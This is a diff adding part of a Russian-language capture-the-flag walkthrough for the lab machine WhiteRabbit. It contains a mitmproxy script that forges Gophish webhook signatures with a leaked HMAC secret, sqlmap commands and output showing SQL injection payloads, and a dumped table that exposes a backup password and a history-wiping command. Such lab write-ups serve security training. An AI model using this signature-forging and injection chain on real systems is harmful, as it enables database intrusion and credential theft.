@@ -297,3 +297,92 @@ payload тут не будут работать. Место того, чтоб �
 
 Рекомендую лучше разобраться с документацией в `http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks`, и как это все работает под капотом
 
+```py
+from mitmproxy import http
+import json
+import hmac
+import hashlib
+
+SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
+
+def request(flow: http.HTTPFlow):
+    if flow.request.path.startswith("/webhook/") and flow.request.method == "POST":
+        try:
+            raw_data = flow.request.get_content()
+            signature = hmac.new(SECRET, raw_data, hashlib.sha256).hexdigest()
+            flow.request.headers["x-gophish-signature"] = f"sha256={signature}"
+        except Exception as e:
+            flow.request.headers["x-gophish-signature"] = "error-signing"
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \          1 ↵ master 
+  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
+  --headers="Content-Type: application/json" \
+  --proxy="http://127.0.0.1:1717" \
+  --technique=BE --time-sec=3 --dbs
+
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (7681=7681) THEN '' ELSE 0x28 END))-- TjUm","message":"Clicked Link"}
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: {"campaign_id":1,"email":"" AND (SELECT 8200 FROM(SELECT COUNT(*),CONCAT(0x71706a6a71,(SELECT (ELT(8200=8200,1))),0x7178716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FkoX","message":"Clicked Link"}
+---
+[20:14:26] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[20:14:28] [INFO] fetching database names
+[20:14:29] [INFO] retrieved: 'information_schema'
+[20:14:29] [INFO] retrieved: 'phishing'
+[20:14:30] [INFO] retrieved: 'temp'
+available databases [3]:
+[*] information_schema
+[*] phishing
+[*] temp
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \              master 
+  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
+  --headers="Content-Type: application/json" \
+  --proxy="http://127.0.0.1:1717" \
+  -D temp --tables command_log 
+
+
+[20:18:39] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[20:18:39] [INFO] fetching tables for database: 'temp'
+[20:18:39] [INFO] resumed: 'command_log'
+Database: temp
+[1 table]
++-------------+
+| command_log |
++-------------+
+```
+
+```
+(lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \              master 
+  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
+  --headers="Content-Type: application/json" \
+  --proxy="http://127.0.0.1:1717" \
+  -D temp -T command_log --dump 
+
+Database: temp
+Table: command_log
+[6 entries]
++----+---------------------+------------------------------------------------------------------------------+
+| id | date                | command                                                                      |
++----+---------------------+------------------------------------------------------------------------------+
+| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
+| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
+| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
+| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
+| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
+| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
++----+---------------------+------------------------------------------------------------------------------+
+```
+
++ новый поддомен: `http://75951e6ff.whiterabbit.htb`
